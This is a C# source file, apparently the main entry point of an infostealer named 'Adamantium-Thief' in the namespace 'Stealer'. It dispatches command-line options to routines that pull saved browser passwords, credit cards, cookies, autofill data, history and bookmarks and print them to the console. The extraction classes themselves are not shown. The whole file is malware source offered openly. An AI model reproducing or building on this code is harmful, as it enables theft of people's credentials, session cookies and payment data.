/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/Adamantium-Thief
*/

using System;

namespace Stealer
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine("Starting..");

            if (args.Length < 1) {
                Console.WriteLine("Please select command [PASSWORDS/HISTORY/COOKIES/AUTOFILL/CREDIT_CARDS/BOOKMARKS]");
                Environment.Exit(1);
            }

            switch (args[0].ToUpper())
            {
                case "PASSWORDS":
                    {
                        BrowserUtils.ShowPasswords(Passwords.Get());
                        break;
                    }

                case "CREDIT_CARDS":
                    {
                        BrowserUtils.ShowCreditCards(CreditCards.Get());
                        break;
                    }

                case "COOKIES":
                    {
                        BrowserUtils.ShowCookies(Cookies.Get());
                        break;
                    }

                case "BOOKMARKS":
                    {
                        BrowserUtils.ShowBookmarks(Bookmarks.Get());
                        break;
                    }

                case "HISTORY":
                    {
                        BrowserUtils.ShowHistory(History.Get());
                        break;
                    }
                case "AUTOFILL":
                    {
                        BrowserUtils.ShowAutoFill(Autofill.Get());
                        break;
                    }

                default:
                    {
                        Console.WriteLine("Command not found!");
                        break;
                    }
            }

            Console.WriteLine("Coded by LimerBoy <3");
        }
    }   
}